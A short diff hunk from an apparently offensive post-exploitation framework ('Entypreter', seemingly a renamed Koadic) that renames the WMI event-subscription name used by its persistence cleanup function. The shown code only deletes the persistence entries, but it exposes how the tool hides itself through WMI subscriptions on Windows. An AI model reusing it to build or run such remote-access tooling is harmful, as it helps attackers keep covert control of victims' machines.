@@ -211,7 +211,7 @@ entypreter.persist.run = function(cmd)
 
 entypreter.persist.clean = function()
 {
-    var subname = "K0adic";
+    var subname = "Entypreter";
     var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\subscription");
     wmi.Delete("\\\\.\\root\\subscription:__EventFilter.Name=\""+subname+"\"");
     wmi.Delete("\\\\.\\root\\subscription:CommandLineEventConsumer.Name=\""+subname+"\"");
